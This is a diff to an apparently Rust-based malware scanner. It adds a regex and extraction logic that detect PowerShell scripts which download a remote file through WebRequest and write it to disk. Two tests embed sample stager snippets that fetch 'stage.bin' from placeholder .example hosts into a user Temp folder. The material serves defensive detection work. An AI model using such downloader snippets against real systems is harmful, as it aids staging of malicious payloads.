@@ -120,6 +120,14 @@ static WEBREQUEST_FILESTREAM_RE: Lazy<Regex> = Lazy::new(|| {
 });
 
 #[allow(clippy::expect_used)]
+static WEBREQUEST_OPENWRITE_RE: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(
+        r#"(?is)\[(?:System\.)?Net\.WebRequest\]::Create\s*\(\s*([^)]{1,512})\s*\).*?GetResponseStream\s*\(\s*\).*?\[(?:System\.)?IO\.File\]::(?:OpenWrite|Create)\s*\(\s*([^)]{1,512})\s*\)"#,
+    )
+    .expect("webrequest openwrite download")
+});
+
+#[allow(clippy::expect_used)]
 static DOWNLOADSTRING_FRAGMENT_RE: Lazy<Regex> = Lazy::new(|| {
     Regex::new(r#"(?i)\b(?:loadString|ADSTRING)\s*\(\s*'{1,2}(https?://[^'")]+)"#)
         .expect("downloadstring fragment")
@@ -9339,6 +9347,28 @@ fn ps_webrequest_filestream_downloads(text: &str) -> Vec<(String, String)> {
             out.push((src, dst));
         }
     }
+
+    let mut bindings = None;
+    for caps in WEBREQUEST_OPENWRITE_RE.captures_iter(text) {
+        let (Some(url_arg), Some(dst_arg)) = (caps.get(1), caps.get(2)) else {
+            continue;
+        };
+        let Some(src) = ps_literal_url_arg(url_arg.as_str()).or_else(|| {
+            let bindings = bindings.get_or_insert_with(|| ps_string_bindings(text));
+            ps_url_arg(url_arg.as_str(), bindings)
+        }) else {
+            continue;
+        };
+        let Some(dst) = ps_string_arg(
+            dst_arg.as_str(),
+            bindings.get_or_insert_with(|| ps_string_bindings(text)),
+        ) else {
+            continue;
+        };
+        if seen.insert((src.clone(), dst.clone())) {
+            out.push((src, dst));
+        }
+    }
     out
 }
 
@@ -10819,6 +10849,66 @@ while(($bytesRead = $responseStream.Read($buffer, 0, $buffer.Length)) -gt 0) {
                     && dst == "C:\\Users\\puncher\\AppData\\Local\\Temp\\stage.rar"
             )),
             "WebRequest/FileStream destination was not surfaced: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn webrequest_filestream_variable_destination_is_extracted() {
+        let script = br#"
+$url = 'https://ps-webrequest-vars.example/stage.bin'
+$dst = 'C:\Users\puncher\AppData\Local\Temp\stage.bin'
+$request = [System.Net.WebRequest]::Create($url)
+$response = $request.GetResponse()
+$responseStream = $response.GetResponseStream()
+$fileStream = New-Object System.IO.FileStream($dst, [System.IO.FileMode]::Create)
+$responseStream.CopyTo($fileStream)
+"#;
+        let mut env = Environment::new(&Config::default());
+        env.all_extracted_ps1.push(script.to_vec());
+
+        super::scan_ps1_payloads(&mut env);
+
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download {
+                    src,
+                    dst: Some(dst),
+                    ..
+                } if src == "https://ps-webrequest-vars.example/stage.bin"
+                    && dst == "C:\\Users\\puncher\\AppData\\Local\\Temp\\stage.bin"
+            )),
+            "WebRequest/FileStream variable destination was not surfaced: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn webrequest_openwrite_destination_is_extracted() {
+        let script = br#"
+$request = [System.Net.WebRequest]::Create('https://ps-webrequest-openwrite.example/stage.bin')
+$response = $request.GetResponse()
+$responseStream = $response.GetResponseStream()
+$fileStream = [System.IO.File]::OpenWrite('C:\Users\puncher\AppData\Local\Temp\openwrite.bin')
+$responseStream.CopyTo($fileStream)
+"#;
+        let mut env = Environment::new(&Config::default());
+        env.all_extracted_ps1.push(script.to_vec());
+
+        super::scan_ps1_payloads(&mut env);
+
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download {
+                    src,
+                    dst: Some(dst),
+                    ..
+                } if src == "https://ps-webrequest-openwrite.example/stage.bin"
+                    && dst == "C:\\Users\\puncher\\AppData\\Local\\Temp\\openwrite.bin"
+            )),
+            "WebRequest/OpenWrite destination was not surfaced: {:?}",
             env.traits
         );
     }
